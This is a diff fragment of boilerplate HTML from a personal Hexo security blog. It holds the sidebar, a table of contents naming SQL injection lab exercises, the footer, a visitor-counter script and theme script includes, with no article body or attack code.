+                alt="volcano18" />
+            
+              <p class="site-author-name" itemprop="name">volcano18</p>
+              <p class="site-description motion-element" itemprop="description">没有网络安全就没有国家安全</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/volcano18" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1406753911@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Injection"><span class="nav-number">1.</span> <span class="nav-text">SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-GET-Search"><span class="nav-number">1.1.</span> <span class="nav-text">SQL Injection (GET/Search)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-GET-Select"><span class="nav-number">1.2.</span> <span class="nav-text">SQL Injection (GET/Select)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-POST-Search"><span class="nav-number">1.3.</span> <span class="nav-text">SQL Injection (POST/Search)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-POST-Select"><span class="nav-number">1.4.</span> <span class="nav-text">SQL Injection (POST/Select)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-AJAX-JSON-jQuery"><span class="nav-number">1.5.</span> <span class="nav-text">SQL Injection (AJAX/JSON/jQuery)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-CAPTCHA"><span class="nav-number">1.6.</span> <span class="nav-text">SQL Injection(CAPTCHA)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-Login-Form-Hero"><span class="nav-number">1.7.</span> <span class="nav-text">SQL Injection (Login Form/Hero)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-Login-Form-User"><span class="nav-number">1.8.</span> <span class="nav-text">SQL Injection(Login Form/User)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-SQLite"><span class="nav-number">1.9.</span> <span class="nav-text">SQL Injection(SQLite)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Drupal-SQL-Injection-Drupageddon"><span class="nav-number">1.10.</span> <span class="nav-text">Drupal SQL Injection (Drupageddon)</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">volcano18</span>
+  
+</div>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+-->
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共8.4k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("QI6N3Ey4HbWodoVY8XENi7cr-gzGzoHsz", "VkIqw7t1stJAh92iA5x4LEkC");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":100,"height":180},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
